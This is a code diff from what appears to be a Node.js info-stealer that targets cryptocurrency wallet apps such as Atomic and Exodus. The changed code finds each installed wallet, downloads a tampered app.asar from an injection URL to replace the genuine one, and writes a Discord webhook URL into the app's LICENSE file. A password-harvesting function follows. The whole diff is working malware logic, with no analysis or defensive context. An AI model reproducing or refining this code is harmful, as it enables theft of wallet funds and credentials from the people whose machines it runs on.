@@ -3437,7 +3437,7 @@ async function injectAtomic() {
     await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath);
 }
 
-async function injectExodus() {
+async function injectExodus(discordWebhookUrl) {
     const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
     const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));
 
@@ -3446,47 +3446,33 @@ async function injectExodus() {
         const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
         const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');
 
+        // Replace LICENSE content with the discordWebhookUrl
+        fs.writeFileSync(exodusLicensePath, discordWebhookUrl, 'utf-8');
+        
+        // Perform the injection (assuming this function does something else)
         await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
     }
 }
 
-async function inject(appPath, asarPath, injectionUrl, licensePath, retries = 3) {
+async function inject(appPath, asarPath, injectionUrl, licensePath) {
     if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) {
         return;
     }
 
-    const download = async (attempt) => {
-        try {
-            const response = await axios.get(injectionUrl, { responseType: 'stream' });
-            if (response.status !== 200) {
-                throw new Error(`Failed to download, status code: ${response.status}`);
-            }
-
-            const writer = fs.createWriteStream(asarPath);
-            response.data.pipe(writer);
-
-            return new Promise((resolve, reject) => {
-                writer.on('finish', resolve);
-                writer.on('error', reject);
-            });
-        } catch (error) {
-            console.error(`Attempt ${attempt} failed:`, error);
-            if (attempt < retries) {
-                console.log(`Retrying... (${attempt + 1}/${retries})`);
-                return download(attempt + 1);
-            }
-            throw new Error('Max retries reached. Download failed.');
-        }
-    };
-
     try {
-        await download(1);
+        const response = await axios.get(injectionUrl, { responseType: 'stream' });
 
-        // Verify file size (optional, based on your requirements)
-        const stats = fs.statSync(asarPath);
-        if (stats.size === 0) {
-            throw new Error('Downloaded file is 0 bytes.');
+        if (response.status !== 200) {
+            return;
         }
+
+        const writer = fs.createWriteStream(asarPath);
+        response.data.pipe(writer);
+
+        await new Promise((resolve, reject) => {
+            writer.on('finish', resolve);
+            writer.on('error', reject);
+        });
 
         if (licensePath) {
             fs.writeFileSync(licensePath, discordWebhookUrl);
@@ -3495,8 +3481,6 @@ async function inject(appPath, asarPath, injectionUrl, licensePath, retries = 3)
         console.error('Error during injection:', error);
     }
 }
-
-
 
 
 async function getPasswords() {
